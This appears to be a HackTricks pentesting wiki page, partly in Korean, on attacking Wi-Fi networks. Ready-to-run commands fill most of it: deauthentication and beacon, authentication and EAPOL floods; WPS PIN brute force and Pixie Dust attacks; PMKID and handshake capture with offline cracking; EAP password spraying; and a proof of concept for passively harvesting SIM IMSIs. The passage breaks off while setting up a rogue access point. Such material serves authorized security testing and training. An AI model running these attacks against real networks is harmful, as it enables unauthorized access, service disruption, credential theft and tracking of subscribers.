# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi 기본 명령
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## 도구

### Hijacker & NexMon (Android 내부 Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**airgeddon을 docker로 실행하기**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

이 도구는 Evil Twin, KARMA, Known Beacons 공격을 수행한 후 phishing 템플릿을 사용해 네트워크 실제 비밀번호를 얻거나 소셜 네트워크 인증 정보를 탈취할 수 있다.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

이 도구는 **WPS/WEP/WPA-PSK** 공격을 자동화합니다. 자동으로 다음을 수행합니다:

- 인터페이스를 monitor mode로 설정
- 가능한 네트워크를 스캔하고 피해자(들)를 선택하게 함
- WEP인 경우 - WEP 공격 실행
- WPA-PSK인 경우
- WPS인 경우: Pixie dust attack과 the bruteforce attack 실행(주의: brute-force 공격은 오래 걸릴 수 있음). null PIN 또는 database/generated PINs는 시도하지 않음.
- AP에서 PMKID를 캡처해 crack을 시도
- AP의 클라이언트를 deauthenticate하려 시도해 handshake를 캡처
- PMKID 또는 Handshake가 있으면 top5000 passwords를 사용해 bruteforce 시도

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- 모두(또는 특정 ESSID/Client)의 연결을 끊음
- Random fake APs -- 네트워크 숨김, 스캐너 충돌 가능
- Overload AP -- AP를 중단시키려 시도(대체로 유용하지 않음)
- WIDS -- IDS 조작
- TKIP, EAPOL -- 일부 AP에 DoS를 유발하는 특정 공격들
- **Cracking**
- Crack **WEP** (여러 도구와 방법)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- captive portal creds를 캡처하거나 LAN 공격 수행에 유용
- **WPA-PSK** Evil Twin -- 비밀번호를 알고 있으면 네트워크 공격에 유용
- **WPA-MGT** -- 회사 자격증명 캡처에 유용
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- captive portal creds를 캡처하거나 LAN 공격 수행에 유용
- **+ WPA** -- WPA handshakes 캡처에 유용

## DOS

### Deauthentication 패킷

**설명 출처** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Deauthentication 공격은 Wi‑Fi 해킹에서 널리 사용되는 방법으로, "management" 프레임을 위조해 장치를 네트워크에서 강제로 분리시키는 것을 포함합니다. 이 암호화되지 않은 패킷들은 클라이언트에게 합법적인 네트워크에서 온 것처럼 속여 WPA handshakes를 수집해 cracking에 이용하거나 네트워크 연결을 지속적으로 방해하는 데 사용됩니다. 이 전술은 그 단순성 때문에 특히 위험하며 네트워크 보안에 중대한 영향을 미칩니다.

**Aireplay-ng를 사용한 Deauthentication**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0는 deauthentication을 의미합니다
- 1은 보낼 deauths의 수입니다(원하면 여러 개를 보낼 수 있음); 0은 계속해서 전송하라는 의미입니다
- -a 00:14:6C:7E:40:80은 access point의 MAC 주소입니다
- -c 00:0F:B5:34:30:30은 deauthenticate할 client의 MAC 주소입니다; 이것을 생략하면 브로드캐스트 deauthentication이 전송됩니다(항상 작동하지 않을 수 있음)
- ath0은 인터페이스 이름입니다

### Disassociation Packets

**Disassociation packets**, similar to deauthentication packets, are a type of management frame used in Wi-Fi networks. 이러한 패킷은 장치(예: 노트북 또는 스마트폰)와 access point(AP) 간의 연결을 끊는 역할을 합니다. disassociation와 deauthentication의 주요 차이는 사용 시나리오에 있습니다. **deauthentication packets은 네트워크에서 rogue devices를 명시적으로 제거하기 위해 사용되는 반면, disassociation packets는 일반적으로 AP가 shutdown 상태일 때 전송됩니다**, 재시작하거나 이동 중일 때 연결된 모든 노드를 분리해야 하기 때문입니다.

**이 공격은 mdk4(mode "d")로 수행할 수 있습니다:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **mdk4의 추가 DOS 공격**

**자세한 내용은** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

비콘 프레임을 전송해 클라이언트에 가짜 APs를 표시합니다. 이로 인해 때때로 네트워크 스캐너나 드라이버가 충돌할 수 있습니다.
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

범위 내의 모든 접근 가능한 Access Points (APs)에 인증 프레임을 전송하면, 특히 다수의 클라이언트가 관련된 경우 해당 APs에 과부하를 일으킬 수 있습니다. 이러한 과도한 트래픽은 시스템 불안정으로 이어져 일부 APs가 멈추거나 심지어 재부팅될 수 있습니다.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs)는 SSID가 제대로 노출되는지 확인하고 AP의 범위를 확인합니다. 이 기술은 워드리스트 사용 여부와 관계없이 **bruteforcing hidden SSIDs**와 결합하면 은폐된 네트워크를 식별하고 접근하는 데 도움이 됩니다.

**ATTACK MODE m: Michael Countermeasures Exploitation**

무작위 또는 중복 패킷을 다른 QoS 큐로 전송하면 **TKIP APs**에서 Michael Countermeasures를 유발할 수 있으며, 이로 인해 AP가 1분간 셧다운됩니다. 이 방법은 효율적인 **DoS** (Denial of Service) 공격 전술입니다.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

AP에 **EAPOL Start frames**를 대량으로 전송하면 **fake sessions**이 생성되어 AP가 과부하되고 정상적인 클라이언트의 접속을 차단합니다. 또는 **fake EAPOL Logoff messages**를 주입하면 클라이언트의 연결이 강제로 끊기며, 두 방법 모두 네트워크 서비스를 효과적으로 방해합니다.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: IEEE 802.11s 메시 네트워크에 대한 공격**

메시 네트워크의 링크 관리 및 라우팅에 대한 다양한 공격.

**ATTACK MODE w: WIDS 혼란**

클라이언트를 여러 WDS 노드나 가짜 rogue APs에 교차 연결하면 Intrusion Detection and Prevention Systems를 조작하여 혼란을 초래하고 잠재적인 시스템 악용을 유발할 수 있다.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

다양한 패킷 소스와 패킷 조작을 위한 포괄적인 수정자 세트를 갖춘 Packet Fuzzer입니다.

### **Airggedon**

_**Airgeddon**_은 이전에 언급된 대부분의 공격을 제공합니다:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup)는 라우터에 장치를 연결하는 과정을 단순화하여 **WPA** 또는 **WPA2** Personal로 암호화된 네트워크의 설정 속도와 편의성을 향상시킵니다. WEP처럼 쉽게 깨지는 보안에는 효과가 없습니다. WPS는 8자리 PIN을 사용하며, 두 부분으로 검증되기 때문에 조합 수가 제한되어 있어 (약 11,000가지) brute-force attacks에 취약합니다.

### WPS Bruteforce

이 작업을 수행하는 주요 도구는 2가지가 있습니다: Reaver와 Bully.

- **Reaver**는 WPS에 대한 강력하고 실용적인 공격으로 설계되었으며, 다양한 access points와 WPS 구현체에서 테스트되었습니다.
- **Bully**는 C로 작성된 WPS brute force 공격의 **new implementation**입니다. 원래의 reaver 코드에 비해 의존성 감소, 향상된 메모리 및 cpu 성능, 올바른 endianness 처리, 더 강력한 옵션 세트 등의 여러 장점이 있습니다.

이 공격은 **WPS PIN's vulnerability**를 악용합니다. 특히 처음 네 자리의 노출과 마지막 자리의 체크섬 역할 때문에 brute-force attacks가 용이합니다. 그러나 공격자의 **blocking MAC addresses**와 같은 brute-force 방어가 있을 경우, 공격을 계속하려면 **MAC address rotation**이 필요합니다.

예를 들어 Bully나 Reaver 같은 도구로 WPS PIN을 얻으면, 공격자는 WPA/WPA2 PSK를 유추하여 **persistent network access**를 확보할 수 있습니다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

이 정교한 접근법은 알려진 취약점을 이용해 WPS PINs를 겨냥합니다:

1. **Pre-discovered PINs**: 특정 제조사가 일관된 WPS PINs를 사용하는 것으로 알려진 경우, 해당 제조사와 연관된 알려진 PINs 데이터베이스를 활용합니다. 이 데이터베이스는 MAC-addresses의 처음 세 옥텟을 해당 제조사에 대해 가능성이 높은 PINs와 연관시킵니다.
2. **PIN Generation Algorithms**: ComputePIN 및 EasyBox와 같은 알고리즘을 활용하여 AP의 MAC-address를 기반으로 WPS PINs를 계산합니다. Arcadyan 알고리즘은 추가로 device ID가 필요해 PIN 생성 과정에 한층 더해집니다.

### WPS Pixie Dust attack

**Dominique Bongard**은 일부 Access Points (APs)에서 비밀 코드인 **nonces** (**E-S1** 및 **E-S2**) 생성과 관련된 결함을 발견했습니다. 이 nonces를 알아낼 수 있다면 AP의 WPS PIN을 해독하는 것이 쉬워집니다. AP는 자신이 합법적이며 가짜 (rogue) AP가 아님을 증명하기 위해 특별한 코드 (hash) 안에 PIN을 공개합니다. 이 nonces는 본질적으로 WPS PIN을 담고 있는 "금고"를 여는 "keys"입니다. 자세한 내용은 [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)에서 확인할 수 있습니다.

간단히 말해, 문제는 일부 AP들이 연결 과정에서 PIN을 암호화할 때 충분히 랜덤한 키를 사용하지 않았다는 점입니다. 이로 인해 PIN은 네트워크 외부에서 추측될 수 있는 취약성 (offline brute force attack)에 노출됩니다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
장치를 monitor mode로 전환하고 싶지 않거나 `reaver`와 `bully`에 문제가 있다면 [OneShot-C](https://github.com/nikita-yfh/OneShot-C)를 시도해 보세요. 이 도구는 monitor mode로 전환하지 않고도 Pixie Dust attack을 수행할 수 있습니다.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

설계가 부실한 일부 시스템은 심지어 **Null PIN**(빈 또는 존재하지 않는 PIN)으로 액세스를 허용하는 경우가 있어, 이는 꽤 이례적입니다. 도구 **Reaver**는 이 취약점을 테스트할 수 있지만 **Bully**는 그렇지 않습니다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

모든 제안된 WPS 공격은 _**airgeddon.**_을 사용하면 쉽게 수행할 수 있습니다.

![](<../../images/image (219).png>)

- 5와 6은 **사용자 지정 PIN**(있는 경우)을 시도해볼 수 있게 해줍니다
- 7과 8은 **Pixie Dust attack**을 수행합니다
- 13은 **NULL PIN**을 테스트할 수 있게 해줍니다
- 11과 12는 선택한 AP와 관련된 PIN을 사용 가능한 데이터베이스에서 **수집**하고, ComputePIN, EasyBox 및 선택적으로 Arcadyan(권장, why not?)을 사용해 가능한 **PIN**을 **생성**합니다
- 9와 10은 **모든 가능한 PIN**을 테스트합니다

## **WEP**

지금은 거의 깨져 있고 사용되지 않습니다. _**airgeddon**_에는 이러한 종류의 보호를 공격하기 위한 "All-in-One"이라는 WEP 옵션이 있다는 것만 알아두세요. 다른 도구들도 유사한 옵션을 제공합니다.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

2018년에 **hashcat**은 [공개](https://hashcat.net/forum/thread-7717.html)한 새로운 공격 방법을 소개했는데, 이 방법은 단지 **하나의 패킷**만 필요하고 대상 AP에 클라이언트가 연결되어 있을 필요가 없다는 점에서 독특합니다 — 공격자와 AP 사이의 상호작용만 있으면 됩니다.

많은 현대 라우터들은 연결 과정에서 **첫 번째 EAPOL** 프레임에 `Robust Security Network`로 알려진 **선택적 필드**를 추가합니다. 여기에는 `PMKID`가 포함됩니다.

원문 게시물에서 설명한 바와 같이, **PMKID**는 알려진 데이터를 사용하여 생성됩니다:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
"PMK Name"이 일정하고, AP와 station의 BSSID를 알고 있으며, `PMK`가 전체 4-way handshake의 것과 동일하므로, **hashcat**은 이 정보를 이용해 PSK를 크랙하여 패스프레이즈를 복구할 수 있습니다!

이 정보를 **gather**하고 로컬에서 비밀번호를 **bruteforce**하려면 다음을 수행할 수 있습니다:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs 캡처됨**은 **console**에 표시되고 또한 \_ **/tmp/attack.pcap**\_에 **saved**됩니다\
이제 캡처를 **hashcat/john** 포맷으로 변환하고 crack 하세요:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Please note the format of a correct hash contains **4 parts**, like: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` If yours **only** contains **3 parts**, then, it is **invalid** (the PMKID capture wasn't valid).

Note that `hcxdumptool` **also capture handshakes** (something like this will appear: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). You could **transform** the **handshakes** to **hashcat**/**john** format using `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Handshake 캡처

**WPA/WPA2** 네트워크에 대한 공격은 **handshake**를 캡처하고 비밀번호를 **offline**에서 **crack** 시도함으로써 수행할 수 있습니다. 이 과정은 특정 채널의 특정 네트워크 및 **BSSID**의 통신을 모니터링하는 것을 포함합니다. 다음은 간략한 가이드입니다:

1. 타깃 네트워크의 **BSSID**, **channel**, 및 **연결된 클라이언트**를 식별합니다.
2. `airodump-ng`를 사용하여 지정된 **channel**과 **BSSID**의 네트워크 트래픽을 모니터링하여 handshake를 캡처하도록 시도합니다. 명령은 다음과 같이 보일 것입니다:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. handshake를 캡처할 가능성을 높이려면 client를 잠시 network에서 끊어 re-authentication을 강제하세요. 이는 client에게 deauthentication packets를 전송하는 `aireplay-ng` 명령으로 수행할 수 있습니다:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network._

`airodump-ng`에 handshake 정보가 나타나면 handshake가 캡처된 것이므로 수집을 중지해도 됩니다:

![](<../../images/image (172) (1).png>)

handshake가 캡처되면 `aircrack-ng`로 **crack**할 수 있습니다:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### 파일에 handshake가 있는지 확인

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_이 툴이 완성된 handshake보다 먼저 특정 ESSID의 미완성 handshake를 찾으면, 유효한 handshake를 감지하지 못합니다._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

**엔터프라이즈 WiFi 환경에서는 다양한 인증 방식을 만나게 됩니다.** 각각은 서로 다른 보안 수준과 관리 기능을 제공합니다. `airodump-ng` 같은 도구로 네트워크 트래픽을 조사하면 이러한 인증 유형을 식별하는 식별자들이 표시되는 것을 볼 수 있습니다. 일반적인 방식은 다음과 같습니다:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- 이 방법은 EAP-PEAP 내에서 하드웨어 토큰과 일회용 비밀번호를 지원한다. MSCHAPv2와 달리 peer challenge를 사용하지 않으며 비밀번호를 평문으로 액세스 포인트에 전송하므로 downgrade 공격의 위험이 있다.
2. **EAP-MD5 (Message Digest 5)**:
- 클라이언트가 비밀번호의 MD5 해시를 전송하는 방식이다. 사전 공격에 취약하고 서버 인증이 없으며 세션별 WEP 키를 생성할 수 없기 때문에 **권장되지 않는다**.
3. **EAP-TLS (Transport Layer Security)**:
- 클라이언트 측과 서버 측의 인증서를 모두 사용하여 인증하며, 통신 보호를 위해 사용자 기반 및 세션 기반의 동적 WEP 키를 생성할 수 있다.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- 암호화된 터널을 통해 상호 인증을 제공하고, 사용자별·세션별 동적 WEP 키를 유도하는 방법을 제공한다. 서버 측 인증서만 필요하며 클라이언트는 자격 증명을 사용한다.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- EAP와 유사하게 보호된 통신을 위해 TLS 터널을 생성한다. 터널이 제공하는 보호 덕분에 EAP 위에 약한 인증 프로토콜을 사용할 수 있다.
- **PEAP-MSCHAPv2**: 흔히 PEAP라고 불리며, 취약한 MSCHAPv2 챌린지/응답 메커니즘을 보호용 TLS 터널과 결합한 것이다.
- **PEAP-EAP-TLS (or PEAP-TLS)**: EAP-TLS와 유사하나 인증서 교환 전에 TLS 터널을 시작하여 추가적인 보안 계층을 제공한다.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **username** is going to be sent in **clear** in the **"Response Identity"** messages.

Even using one of the most secure of authentication methods: **PEAP-EAP-TLS**, it is possible to **capture the username sent in the EAP protocol**. To do so, **capture a authentication communication** (start `airodump-ng` inside a channel and `wireshark` in the same interface) and filter the packets by`eapol`.\
Inside the "**Response, Identity**" packet, the **username** of the client will appear.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding is supported by both EAP-PEAP and EAP-TTLS. In the context of a WiFi network, an EAP-Identity request is typically initiated by the access point (AP) during the association process. To ensure the protection of user anonymity, the response from the EAP client on the user's device contains only the essential information required for the initial RADIUS server to process the request. This concept is illustrated through the following scenarios:

- EAP-Identity = anonymous
- In this scenario, all users employ the pseudonymous "anonymous" as their user identifier. The initial RADIUS server functions as either an EAP-PEAP or EAP-TTLS server, responsible for managing the server-side of the PEAP or TTLS protocol. The inner (protected) authentication method is then either handled locally or delegated to a remote (home) RADIUS server.
- EAP-Identity = anonymous@realm_x
- In this situation, users from different realms conceal their identities while indicating their respective realms. This allows the initial RADIUS server to proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms, which act as the PEAP or TTLS server. The initial RADIUS server operates solely as a RADIUS relay node.
- Alternatively, the initial RADIUS server may function as the EAP-PEAP or EAP-TTLS server and either handle the protected authentication method or forward it to another server. This option facilitates the configuration of distinct policies for various realms.

In EAP-PEAP, once the TLS tunnel is established between the PEAP server and the PEAP client, the PEAP server initiates an EAP-Identity request and transmits it through the TLS tunnel. The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user's true identity through the encrypted tunnel. This approach effectively prevents the revelation of the user's actual identity to anyone eavesdropping on the 802.11 traffic.

EAP-TTLS follows a slightly different procedure. With EAP-TTLS, the client typically authenticates using PAP or CHAP, secured by the TLS tunnel. In this case, the client includes a User-Name attribute and either a Password or CHAP-Password attribute in the initial TLS message sent after tunnel establishment.

Regardless of the protocol chosen, the PEAP/TTLS server obtains knowledge of the user's true identity after the TLS tunnel has been established. The true identity can be represented as user@realm or simply user. If the PEAP/TTLS server is also responsible for authenticating the user, it now possesses the user's identity and proceeds with the authentication method protected by the TLS tunnel. Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user's home RADIUS server. This new RADIUS request omits the PEAP or TTLS protocol layer. In cases where the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper. The User-Name attribute of the outgoing RADIUS message contains the user's true identity, replacing the anonymous User-Name from the incoming RADIUS request. When the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes extracted from the TLS payload are substituted in the outgoing RADIUS message, displacing the anonymous User-Name and TTLS EAP-Message attributes found in the incoming RADIUS request.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM 기반 Wi‑Fi 인증에서 EAP‑SIM/EAP‑AKA를 802.1X 위에서 사용할 경우, 배포가 pseudonyms/protected identities를 구현하지 않거나 inner EAP 주위에 TLS 터널을 두지 않으면 인증되지 않은 identity 단계에서 영구 가입자 식별자(IMSI)가 평문으로 leak될 수 있다.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>확장하려면 클릭</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

노트:
- 배포가 protected identity/pseudonyms 없이 bare EAP‑SIM/AKA를 사용하는 경우 TLS 터널 이전에 작동합니다.
- 노출된 값은 가입자 SIM에 연결된 영구 식별자이며, 수집 시 장기 추적 및 이후의 통신사 악용을 가능하게 합니다.

영향
- 프라이버시: 공공 장소에서의 수동 Wi‑Fi 캡처로 인한 지속적인 사용자/기기 추적.
- 통신망 악용의 발판: IMSI로 SS7/Diameter 접근 권한이 있는 공격자는 위치 조회를 하거나 통화/SMS 가로채기 및 MFA 탈취를 시도할 수 있습니다.

완화 / 확인 사항
- 클라이언트가 3GPP 지침(예: 3GPP TS 33.402)에 따라 EAP‑SIM/AKA에 대해 익명 외부 식별자(가명)를 사용하는지 확인하세요.
- 신원 확인 단계를 터널링(EAP‑TTLS/PEAP가 내부에 EAP‑SIM/AKA를 담는 방식 등)하는 것이 바람직하며, 이렇게 하면 IMSI가 평문으로 전송되지 않습니다.
- association/auth의 패킷 캡처에서 EAP-Response/Identity에 원시 IMSI가 드러나지 않아야 합니다.

관련: 캡처된 모바일 식별자를 이용한 통신 신호 악용
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

클라이언트가 **username and password** 사용이 예상되는 경우(이 경우 **EAP-TLS won't be valid**), **usernames** 목록(다음 부분 참조)과 **passwords**를 확보한 뒤 [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)를 이용해 접근을 **bruteforce** 해볼 수 있습니다.
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
이 공격은 `eaphammer`를 사용해서도 수행할 수 있습니다:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## 클라이언트 공격 이론

### 네트워크 선택 및 로밍

- The 802.11 protocol defines how a station joins an Extended Service Set (ESS) but does not specify the criteria for selecting an ESS or an access point (AP) within it.
- 스테이션은 동일한 ESSID를 공유하는 AP들 사이를 로밍할 수 있어 건물 전체나 지역에서 연결을 유지합니다.
- The protocol requires station authentication to the ESS but does not mandate AP authentication to the station.

### Preferred Network Lists (PNLs)

- 스테이션은 연결한 모든 무선 네트워크의 ESSID를 Preferred Network List (PNL)에 저장하며, 네트워크별 구성 세부정보도 함께 저장합니다.
- PNL은 알려진 네트워크에 자동으로 연결하는 데 사용되어 연결 과정을 간소화해 사용자 경험을 향상합니다.

### Passive Scanning

- AP는 주기적으로 beacon frames를 브로드캐스트하여 존재와 기능을 알리며, 브로드캐스트가 비활성화되지 않은 경우 AP의 ESSID를 포함합니다.
- 수동 스캐닝 동안 스테이션은 beacon frames를 수신 대기합니다. beacon의 ESSID가 스테이션의 PNL 항목과 일치하면 스테이션은 해당 AP에 자동으로 연결할 수 있습니다.
- 디바이스의 PNL을 알면 알려진 네트워크의 ESSID를 모방하여 디바이스를 rogue AP에 연결시켜 악용할 수 있습니다.

### Active Probing

- 능동 프로빙은 스테이션이 probe requests를 보내 근처 AP와 그 특성을 탐지하는 것입니다.
- Directed probe requests는 특정 ESSID를 겨냥해 해당 네트워크가 범위 내에 있는지(숨겨진 네트워크인 경우라도) 탐지하는 데 도움을 줍니다.
- Broadcast probe requests는 SSID 필드가 null이며 근처의 모든 AP로 전송되어 스테이션이 PNL 내용을 노출하지 않고도 우선 네트워크를 확인할 수 있게 합니다.

## 인터넷으로 트래픽을 리디렉션하는 간단한 AP

더 복잡한 공격을 수행하는 방법을 설명하기 전에 **어떻게** 단순히 **AP**를 **생성**하고 그 **트래픽**을 **인터넷**에 연결된 인터페이스로 **리디렉션**하는지를 설명하겠습니다.

Using `ifconfig -a` check that the wlan interface to create the AP and the interface connected to the Internet are present.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
구성 파일 `/etc/dnsmasq.conf`을 생성하세요:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
그런 다음 **set IPs** 및 **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
그런 다음 dnsmasq를 **시작**합니다:
